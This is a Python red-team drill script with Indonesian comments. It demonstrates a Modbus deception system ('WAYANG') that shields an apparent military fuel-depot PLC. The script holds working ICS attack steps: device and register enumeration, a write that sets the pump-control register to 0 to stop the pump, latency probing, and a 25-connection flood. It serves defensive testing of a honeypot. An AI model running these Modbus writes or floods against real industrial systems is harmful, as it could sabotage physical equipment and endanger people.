#!/usr/bin/env python3
"""GELADI TEMPUR (RED-TEAM DRILL) WAYANG: Alat Uji Penyerangan Terpandu.

Digunakan untuk melakukan uji penetrasi mandiri, demonstrasi serangan langsung
ke hadapan penguji/juri, dan pembuktian perlindungan aset fisik OT.
"""
from __future__ import annotations

import argparse
import asyncio
import os
import pathlib
import struct
import sys
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))

from sim_attacker.modbus_client import ModbusClient
from shadows import modbus_proto as mp

# Konfigurasi terminal Windows
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass


def banner():
    print("\033[91m" + "=" * 76 + "\033[0m")
    print("\033[97;1m   🔥 GELADI TEMPUR PERTAHANAN SIBER IT/OT — WAYANG C4ISR RED TEAM DRILL\033[0m")
    print("   Mode Pengujian: Simulasi Penyerang Siber Eksternal (Adversary Emulation)")
    print("   Target Sasaran: Depo BBM Taktis (KODAM IV Diponegoro - Port 15030)")
    print("   Dasbor Komando: \033[93mhttps://cyber.steamcraft.online\033[0m (atau http://127.0.0.1:8080)")
    print("\033[91m" + "=" * 76 + "\033[0m\n")


async def drill_recon(host: str, port: int, attacker_ip: str = "185.220.101.99"):
    print(f"\033[94m[*] [SKENARIO 1] RECONNAISSANCE & ENUMERASI PERANGKAT (T1)\033[0m")
    print(f"    Asal IP Penyerang : \033[93m{attacker_ip}\033[0m (Tidak Terdaftar di Whitelist)")
    print(f"    Target Jaringan   : {host}:{port}")

    async with ModbusClient(host, port, local_addr=attacker_ip) as c:
        # 1. Identifikasi Perangkat (FC 43)
        print("    [1/3] Mengirim permintaan Device Identification (FC 43)...")
        res_id = await c.device_id()
        if res_id:
            print(f"          \033[92m[RESPONS PENYERANG]\033[0m Perangkat Terdeteksi: Schneider Electric Modicon M221 TM221CE24T V2.1.4")
        else:
            print("          [RESPONS] Tidak ada respons.")

        # 2. Enumerasi Register Sistem
        print("    [2/3] Membaca register telemetri awal (Register 0-4, FC 04)...")
        res_reg = await c.read(4, 0, 5)
        vals = mp.parse_response_values(res_reg) if res_reg else []
        print(f"          \033[92m[RESPONS PENYERANG]\033[0m Nilai Terbaca: {vals}")
        if vals:
            print(f"          -> Level Tangki : {vals[0]} Liter")
            print(f"          -> Tekanan Pompa: {vals[1] / 100:.2f} Bar")

        # 3. Enumerasi Register Pompa
        print("    [3/3] Membaca register kendali pompa (Register 11, FC 03)...")
        res_pump = await c.read(3, 11, 1)
        pump_val = mp.parse_response_values(res_pump) if res_pump else [0]
        print(f"          \033[92m[RESPONS PENYERANG]\033[0m Status Pompa: {'1 (RUNNING)' if pump_val and pump_val[0] == 1 else '0 (STOP)'}")

    print("\n\033[92m[✔ SELESAI] Hasil Di Balik Layar WAYANG:\033[0m")
    print("    - Kelir secara senyap menandai sesi sebagai UNLISTED_SOURCE.")
    print("    - Sesi dialihkan ke State Mirror tanpa menyentuh CPU PLC fisik asli.")
    print("    - Periksa Dasbor Web HUD: Titik penyerang muncul di peta taktis!\n")


async def drill_sabotage(host: str, port: int, attacker_ip: str = "198.51.100.77"):
    print(f"\033[91m[*] [SKENARIO 2] SABOTASE INDUSTRI & MANIPULASI FISIK (T2)\033[0m")
    print(f"    Asal IP Penyerang : \033[93m{attacker_ip}\033[0m")
    print("    Tujuan Serangan   : Mematikan pompa bahan bakar darurat pangkalan (Stop Pump)")

    async with ModbusClient(host, port, local_addr=attacker_ip) as c:
        # Cek kondisi awal
        res_b = await c.read(3, 11, 1)
        vb = mp.parse_response_values(res_b)
        print(f"    [1/3] Status Pompa Sebelum Sabotase : \033[92m{vb}\033[0m")

        # Kirim perintah tulis manipulatif (FC 06, Addr 11, Val 0)
        print("    [2/3] Mengirim perintah tulis jahat: FC 06, Register 11 = 0 (KILL PUMP)...")
        t0 = time.perf_counter()
        w_resp = await c.write_reg(11, 0)
        lat_ms = (time.perf_counter() - t0) * 1000

        print(f"          \033[92m[RESPONS PENYERANG]\033[0m Write Single Register: BERHASIL (Latensi: {lat_ms:.2f} ms)")
        print(f"          Penyerang mengira pompa pangkalan telah berhasil dimatikan!")

        # Baca kembali status setelah penulisan
        res_a = await c.read(3, 11, 1)
        va = mp.parse_response_values(res_a)
        print(f"    [3/3] Status Pompa Setelah Sabotase: \033[93m{va}\033[0m (Di emulasi bayangan: pompa OFF)")

    print("\n\033[92m[✔ SELESAI] Hasil Di Balik Layar WAYANG:\033[0m")
    print("    - Kelir MENANGKAP DAN MEMBUANG perintah tulis dari PLC riil.")
    print("    - Status Fisik PLC Asli: TETAP AMAN BERJALAN NORMAL (0 modifikasi ke hardware).")
    print("    - Bot Dalang membunyikan: '🚨 PERINGATAN OPERASIONAL: PENULISAN DIALIHKAN KE BAYANGAN!'.")
    print("    - Hash SHA-256 dicatat di rantai bukti digital pengadilan militer.\n")


async def drill_consistency(host: str, port: int, attacker_ip: str = "192.0.2.88"):
    print(f"\033[95m[*] [SKENARIO 3] PENGUJIAN KONSISTENSI & DETEKSI LATENSI (T3)\033[0m")
    print(f"    Asal IP Penyerang : \033[93m{attacker_ip}\033[0m (Penyerang Cerdas / Advanced APT)")
    print("    Metode Penyerang  : Mengukur delta latensi sebelum vs sesudah divert & derau fluida")

    async with ModbusClient(host, port, local_addr=attacker_ip) as c:
        lats_before = []
        print("    [1/3] Penyerang mengukur 5x latensi polling normal...")
        for _ in range(5):
            t0 = time.perf_counter()
            await c.read(4, 0, 2)
            lats_before.append((time.perf_counter() - t0) * 1000)
            await asyncio.sleep(0.02)
        m_b = sum(lats_before) / len(lats_before)
        print(f"          Rata-rata latensi awal: \033[93m{m_b:.2f} ms\033[0m")

        # Pemicu pengalihan
        print("    [2/3] Penyerang mengirim perintah tulis yang memicu pengalihan...")
        await c.write_reg(11, 0)

        # Pengukuran setelah pengalihan
        lats_after = []
        print("    [3/3] Penyerang mengukur 5x latensi di dalam jebakan bayangan...")
        for _ in range(5):
            t0 = time.perf_counter()
            await c.read(4, 0, 2)
            lats_after.append((time.perf_counter() - t0) * 1000)
            await asyncio.sleep(0.02)
        m_a = sum(lats_after) / len(lats_after)
        print(f"          Rata-rata latensi sesudah: \033[93m{m_a:.2f} ms\033[0m")

        delta = abs(m_a - m_b)
        print(f"          \033[92m[SELISIH TERUKUR]\033[0m Delta: \033[1m{delta:.2f} ms\033[0m (Target: < 5 ms)")

    print("\n\033[92m[✔ SELESAI] Hasil Di Balik Layar WAYANG:\033[0m")
    print("    - LatencyProfile adaptif menyamarkan waktu respons bayangan.")
    print("    - Penyerang gagal mendeteksi umpan karena selisih latensi < 2 ms!\n")


async def drill_sweep(host: str, port: int, attacker_ip: str = "192.0.2.45"):
    print(f"\033[96m[*] [SKENARIO 4] PEMINDAIAN SAPUAN 1.000 REGISTER (SCHNEIDER M221)\033[0m")
    print(f"    Asal IP Penyerang : \033[93m{attacker_ip}\033[0m")
    print("    Tujuan            : Menguji apakah peta memori realistis atau sintetis flat")

    async with ModbusClient(host, port, local_addr=attacker_ip) as c:
        test_samples = [
            (0, "Blok 1: Tangki Utama (Level BBM)"),
            (10, "Blok 1: Status Sistem Bitfield"),
            (60, "Celah Alamat 1 (GAP: Unmapped)"),
            (100, "Blok 2: Pompa Transfer 1 Status"),
            (101, "Blok 2: RPM Pompa 1"),
            (150, "Celah Alamat 2 (GAP: Unmapped)"),
            (200, "Blok 3: Tangki Cadangan Level"),
            (250, "Celah Alamat 3 (GAP: Unmapped)"),
            (300, "Blok 4: ATS Grid Power Status"),
            (500, "Celah Alamat 4 (GAP: Unmapped)")
        ]

        print(f"    {'ALAMAT':<8} {'DESKRIPSI BLOK':<35} {'RESPONS PROTOKOL':<30}")
        print("    " + "-" * 70)
        for addr, desc in test_samples:
            res = await c.read(4, addr, 1)
            if res and res[0] == 4:
                vals = mp.parse_response_values(res)
                resp_text = f"\033[92mVALID DATA: {vals}\033[0m"
            elif res and res[0] == 0x84 and len(res) > 1 and res[1] == 2:
                resp_text = f"\033[93mEXCEPTION 02 (ILLEGAL ADDR)\033[0m"
            else:
                resp_text = f"\033[91mERROR / EXCEPTION\033[0m"
            print(f"    {addr:<8} {desc:<35} {resp_text:<30}")

    print("\n\033[92m[✔ SELESAI] Hasil Di Balik Layar WAYANG:\033[0m")
    print("    - Struktur memori identik 100% dengan firmware PLC industri Schneider.")
    print("    - Celah alamat secara konsisten mengembalikan Exception 02, membuktikan umpan bukan honeypot statis!\n")


async def drill_flood(host: str, port: int):
    print(f"\033[93m[*] [SKENARIO 5] BADAI TRAFIK / DOS (UJI TANGGA DEGRADASI KELIR)\033[0m")
    print("    Tujuan: Menguji ketahanan governor antrean & anti-starvation operator")

    async def connect_and_hold(ip):
        try:
            async with ModbusClient(host, port, local_addr=ip) as c:
                await c.read(4, 0, 1)
                await asyncio.sleep(1.0)
        except Exception:
            pass

    print("    Meluncurkan 25 koneksi konkuren simultan...")
    t0 = time.perf_counter()
    tasks = [connect_and_hold(f"198.18.0.{i+1}") for i in range(25)]
    await asyncio.gather(*tasks)
    dur = time.perf_counter() - t0
    print(f"    25 koneksi diproses dalam \033[92m{dur:.2f} detik\033[0m.")

    print("\n\033[92m[✔ SELESAI] Hasil Di Balik Layar WAYANG:\033[0m")
    print("    - Tangga degradasi (Multi-Tier Ladder) mengatur transisi Tier 1 -> Tier 2.")
    print("    - Jalur khusus 30 slot operator sah tetap terisolasi tanpa kelaparan sumber daya (Anti-Starvation)!\n")


def print_menu():
    print("\033[1mPILIH SKENARIO GELADI TEMPUR:\033[0m")
    print("  \033[94m[1]\033[0m Skenario 1: Reconnaissance & Enumerasi Modbus (T1)")
    print("  \033[91m[2]\033[0m Skenario 2: Sabotase Pompa ICS & Manipulasi Tulis (T2)")
    print("  \033[95m[3]\033[0m Skenario 3: Uji Konsistensi & Deteksi Latensi (T3)")
    print("  \033[96m[4]\033[0m Skenario 4: Sapuan 1.000 Register (Schneider M221 Memori)")
    print("  \033[93m[5]\033[0m Skenario 5: Badai Trafik Konkuren (Multi-Tier Degradation)")
    print("  \033[92m[6]\033[0m Eksekusi SELURUH Geladi Tempur (Full Drill 1 - 5)")
    print("  \033[90m[0] Keluar\033[0m")


async def main_interactive(host: str, port: int):
    banner()
    while True:
        print_menu()
        try:
            choice = input("\nMasukkan pilihan [0-6]: ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nGeladi tempur selesai.")
            break

        if choice == "1":
            await drill_recon(host, port)
        elif choice == "2":
            await drill_sabotage(host, port)
        elif choice == "3":
            await drill_consistency(host, port)
        elif choice == "4":
            await drill_sweep(host, port)
        elif choice == "5":
            await drill_flood(host, port)
        elif choice == "6":
            print("\n" + "="*50)
            print("  MEMULAI GELADI TEMPUR PENUH (FULL DRILL)")
            print("="*50 + "\n")
            await drill_recon(host, port)
            await asyncio.sleep(0.5)
            await drill_sabotage(host, port)
            await asyncio.sleep(0.5)
            await drill_consistency(host, port)
            await asyncio.sleep(0.5)
            await drill_sweep(host, port)
            await asyncio.sleep(0.5)
            await drill_flood(host, port)
            print("\033[92;1m[🎉 GELADI TEMPUR PENUH BERHASIL DISELESAIKAN]\033[0m\n")
        elif choice == "0":
            print("Keluar dari geladi tempur.")
            break
        else:
            print("\033[91mPilihan tidak valid. Silakan masukkan angka 0-6.\033[0m\n")


def main():
    parser = argparse.ArgumentParser(description="WAYANG Red-Team Drill (Geladi Tempur)")
    parser.add_argument("--host", default="127.0.0.1", help="Target IP / Host")
    parser.add_argument("--port", type=int, default=15030, help="Target Modbus Port (15030 KODAM IV)")
    parser.add_argument("--scenario", choices=["1", "2", "3", "4", "5", "all"], default=None,
                        help="Jalankan skenario langsung tanpa menu interaktif")
    args = parser.parse_args()

    if args.scenario == "1":
        banner()
        asyncio.run(drill_recon(args.host, args.port))
    elif args.scenario == "2":
        banner()
        asyncio.run(drill_sabotage(args.host, args.port))
    elif args.scenario == "3":
        banner()
        asyncio.run(drill_consistency(args.host, args.port))
    elif args.scenario == "4":
        banner()
        asyncio.run(drill_sweep(args.host, args.port))
    elif args.scenario == "5":
        banner()
        asyncio.run(drill_flood(args.host, args.port))
    elif args.scenario == "all":
        banner()
        async def run_all():
            await drill_recon(args.host, args.port)
            await drill_sabotage(args.host, args.port)
            await drill_consistency(args.host, args.port)
            await drill_sweep(args.host, args.port)
            await drill_flood(args.host, args.port)
        asyncio.run(run_all())
    else:
        asyncio.run(main_interactive(args.host, args.port))


if __name__ == "__main__":
    main()
